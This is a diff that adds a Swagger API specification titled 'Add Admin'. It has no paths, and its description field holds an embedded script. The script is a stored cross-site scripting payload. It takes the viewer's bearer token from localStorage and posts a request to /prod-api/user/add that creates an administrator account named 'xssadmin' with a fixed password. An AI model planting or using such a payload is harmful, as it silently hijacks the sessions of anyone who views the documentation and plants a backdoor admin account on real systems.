@@ -1,0 +1,20 @@
+swagger: "2.0"
+info:
+  title: "Add Admin"
+  version: "1.0"
+  description: |
+    <script>
+      fetch('/prod-api/user/add', {
+        method: 'POST',
+        headers: {
+          'Authorization': 'Bearer ' + localStorage.getItem('token'),
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          username: 'xssadmin',
+          password: 'P@ssw0rd123!',
+          role: 'admin'
+        })
+      });
+    </script>
+paths: {}
